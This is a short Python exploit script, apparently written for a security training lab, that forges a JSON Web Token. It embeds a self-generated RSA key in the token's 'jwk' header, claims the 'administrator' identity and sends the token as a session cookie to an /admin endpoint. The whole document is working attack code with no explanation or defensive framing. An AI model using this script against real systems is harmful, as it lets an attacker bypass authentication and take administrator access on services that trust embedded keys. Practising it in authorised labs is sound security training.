import base64
import jwt
import requests
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# Generate RSA keys
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Encode 'n' and 'e' for JWK
n = base64.urlsafe_b64encode(public_key.public_numbers().n.to_bytes(
    (public_key.public_numbers().n.bit_length() + 7) // 8, 'big')).decode('utf-8').rstrip("=")

# Create JWT header and payload
jwk = {"kty": "RSA", "e": "AQAB", "n": n}
headers = {"alg": "RS256", "jwk": jwk}
payload = {"sub": "administrator"}

# Sign JWT
malicious_jwt = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)

# Send request
url = "http://<lab-url>/admin"  # Replace <lab-url>
cookies = {"session": malicious_jwt}
response = requests.get(url, cookies=cookies)

# Print results
print(f"Status Code: {response.status_code}")
print(f"Response: {response.text}")
